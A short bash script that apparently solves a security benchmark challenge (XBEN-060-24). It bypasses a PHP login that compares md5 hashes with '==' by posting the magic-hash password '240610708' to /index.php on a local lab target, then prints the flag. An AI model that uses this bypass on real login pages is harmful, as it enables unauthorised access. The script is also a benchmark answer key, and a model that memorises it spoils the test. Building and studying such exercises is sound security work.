#!/usr/bin/env bash
# XBEN-060-24 — PHP magic-hash auth bypass. Proxy-mode twin. The password check
# uses `==` on an md5 that starts `0e…`; `240610708` hashes to such a string, so
# it is loosely-equal to the stored hash and logs in.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben060p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/index.php' --set 'form.password=240610708' >/dev/null
print_flag
